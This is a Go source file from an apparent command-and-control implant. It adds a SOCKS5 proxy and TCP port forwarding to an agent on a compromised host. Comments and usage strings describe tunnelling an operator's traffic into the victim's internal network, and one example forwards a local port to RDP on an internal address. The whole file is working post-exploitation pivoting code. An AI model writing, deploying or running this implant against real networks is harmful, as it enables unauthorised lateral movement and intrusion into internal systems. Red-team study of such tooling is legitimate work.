package implant

import (
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// SOCKS5 Proxy — runs on the agent, allowing the operator to tunnel
// traffic through the compromised host into the internal network.
//
// Usage:
//   1. Agent starts SOCKS5 on 127.0.0.1:<port>
//   2. Operator configures proxychains or browser to use the SOCKS proxy
//   3. All traffic routes through the agent into the target network
//
// The C2 server uses port forwarding to expose the agent's SOCKS port.

const (
	socks5Version  = 0x05
	socksNoAuth    = 0x00
	socksConnect   = 0x01
	socksIPv4      = 0x01
	socksDomain    = 0x03
	socksIPv6      = 0x04
	socksSuccess   = 0x00
	socksFailure   = 0x01
)

// SOCKSProxy manages a SOCKS5 proxy server on the agent.
type SOCKSProxy struct {
	listener  net.Listener
	bindAddr  string
	running   bool
	mu        sync.Mutex
	connCount int
}

// Global proxy registry — tracks all active SOCKS proxies.
var (
	activeProxies = make(map[string]*SOCKSProxy)
	proxyMu       sync.Mutex
)

// StartSOCKS starts a SOCKS5 proxy on the agent.
func StartSOCKS(bindAddr string) ([]byte, error) {
	if bindAddr == "" {
		bindAddr = "127.0.0.1:1080"
	}

	proxyMu.Lock()
	if existing, ok := activeProxies[bindAddr]; ok && existing.running {
		proxyMu.Unlock()
		return []byte(fmt.Sprintf("[!] SOCKS5 proxy already running on %s", bindAddr)), nil
	}
	proxyMu.Unlock()

	listener, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return nil, fmt.Errorf("SOCKS bind failed: %w", err)
	}

	proxy := &SOCKSProxy{
		listener: listener,
		bindAddr: bindAddr,
		running:  true,
	}

	proxyMu.Lock()
	activeProxies[bindAddr] = proxy
	proxyMu.Unlock()

	go proxy.serve()

	return []byte(fmt.Sprintf("[+] SOCKS5 proxy started on %s\n[+] Configure proxychains: socks5 %s", bindAddr, bindAddr)), nil
}

// StopSOCKS stops the SOCKS5 proxy. Stops all if no address specified.
func StopSOCKS(args ...string) ([]byte, error) {
	proxyMu.Lock()
	defer proxyMu.Unlock()

	if len(activeProxies) == 0 {
		return []byte("[!] No active SOCKS proxies"), nil
	}

	// If specific address given, stop that one
	if len(args) > 0 && args[0] != "" {
		addr := args[0]
		proxy, ok := activeProxies[addr]
		if !ok {
			return []byte(fmt.Sprintf("[!] No proxy running on %s", addr)), nil
		}
		proxy.stop()
		delete(activeProxies, addr)
		return []byte(fmt.Sprintf("[+] SOCKS5 proxy stopped on %s", addr)), nil
	}

	// Stop all proxies
	var stopped []string
	for addr, proxy := range activeProxies {
		proxy.stop()
		stopped = append(stopped, addr)
	}
	for _, addr := range stopped {
		delete(activeProxies, addr)
	}

	return []byte(fmt.Sprintf("[+] Stopped %d SOCKS5 proxy(ies): %s", len(stopped), fmt.Sprint(stopped))), nil
}

// ListSOCKS returns status of all active proxies.
func ListSOCKS() ([]byte, error) {
	proxyMu.Lock()
	defer proxyMu.Unlock()

	if len(activeProxies) == 0 {
		return []byte("[*] No active SOCKS proxies"), nil
	}

	result := "[*] Active SOCKS proxies:\n"
	for addr, proxy := range activeProxies {
		proxy.mu.Lock()
		result += fmt.Sprintf("  %s — %d connections handled\n", addr, proxy.connCount)
		proxy.mu.Unlock()
	}
	return []byte(result), nil
}

func (s *SOCKSProxy) stop() {
	s.mu.Lock()
	s.running = false
	s.mu.Unlock()
	if s.listener != nil {
		s.listener.Close()
	}
}

func (s *SOCKSProxy) serve() {
	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				continue
			}
			return
		}
		s.mu.Lock()
		s.connCount++
		s.mu.Unlock()
		go s.handleConnection(conn)
	}
}

func (s *SOCKSProxy) handleConnection(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// SOCKS5 handshake
	buf := make([]byte, 256)

	// Read version and auth methods
	n, err := conn.Read(buf)
	if err != nil || n < 3 || buf[0] != socks5Version {
		return
	}

	// Respond with no authentication required
	conn.Write([]byte{socks5Version, socksNoAuth})

	// Read connect request
	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[1] != socksConnect {
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	// Parse target address
	var targetAddr string
	switch buf[3] {
	case socksIPv4:
		if n < 10 {
			return
		}
		ip := net.IP(buf[4:8])
		port := int(buf[8])<<8 | int(buf[9])
		targetAddr = fmt.Sprintf("%s:%d", ip.String(), port)

	case socksDomain:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		domain := string(buf[5 : 5+domainLen])
		port := int(buf[5+domainLen])<<8 | int(buf[6+domainLen])
		targetAddr = fmt.Sprintf("%s:%d", domain, port)

	case socksIPv6:
		if n < 22 {
			return
		}
		ip := net.IP(buf[4:20])
		port := int(buf[20])<<8 | int(buf[21])
		targetAddr = fmt.Sprintf("[%s]:%d", ip.String(), port)

	default:
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	// Connect to target
	target, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}
	defer target.Close()

	// Send success response
	conn.Write([]byte{socks5Version, socksSuccess, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})

	// Set idle timeout for relay (5 minutes) to prevent goroutine leaks
	idleTimeout := 5 * time.Minute
	conn.SetDeadline(time.Now().Add(idleTimeout))
	target.SetDeadline(time.Now().Add(idleTimeout))

	// Bidirectional relay with deadline refresh on activity
	done := make(chan struct{})

	go func() {
		io.Copy(target, conn)
		done <- struct{}{}
	}()

	go func() {
		io.Copy(conn, target)
		done <- struct{}{}
	}()

	// Wait for either direction to finish, then close both
	<-done
	conn.Close()
	target.Close()
	<-done
}

// PortForward creates a simple TCP port forward through the agent.
func PortForward(localAddr, remoteAddr string) ([]byte, error) {
	listener, err := net.Listen("tcp", localAddr)
	if err != nil {
		return nil, fmt.Errorf("port forward bind failed: %w", err)
	}

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer conn.Close()
				remote, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
				if err != nil {
					return
				}
				defer remote.Close()

				var wg sync.WaitGroup
				wg.Add(2)
				go func() { defer wg.Done(); io.Copy(remote, conn) }()
				go func() { defer wg.Done(); io.Copy(conn, remote) }()
				wg.Wait()
			}()
		}
	}()

	return []byte(fmt.Sprintf("[+] Port forward: %s → %s", localAddr, remoteAddr)), nil
}

// ExecuteProxyCommand handles proxy/portfwd task arguments.
func ExecuteProxyCommand(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte("Usage:\n  socks start [bind_addr]     Start SOCKS5 proxy (default: 127.0.0.1:1080)\n  socks stop [bind_addr]      Stop SOCKS5 proxy (all if no addr)\n  socks list                  List active proxies\n  portfwd <local> <remote>    Forward local port to remote"), nil
	}

	switch args[0] {
	case "start":
		bind := "127.0.0.1:1080"
		if len(args) > 1 {
			bind = args[1]
		}
		return StartSOCKS(bind)
	case "stop":
		addr := ""
		if len(args) > 1 {
			addr = args[1]
		}
		return StopSOCKS(addr)
	case "list":
		return ListSOCKS()
	default:
		return []byte("Unknown proxy command. Use: start, stop, list"), nil
	}
}

// ExecutePortFwdCommand handles port forward tasks.
func ExecutePortFwdCommand(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: portfwd <local_addr> <remote_addr>\nExample: portfwd 127.0.0.1:8888 10.0.1.5:3389"), nil
	}
	return PortForward(args[0], args[1])
}
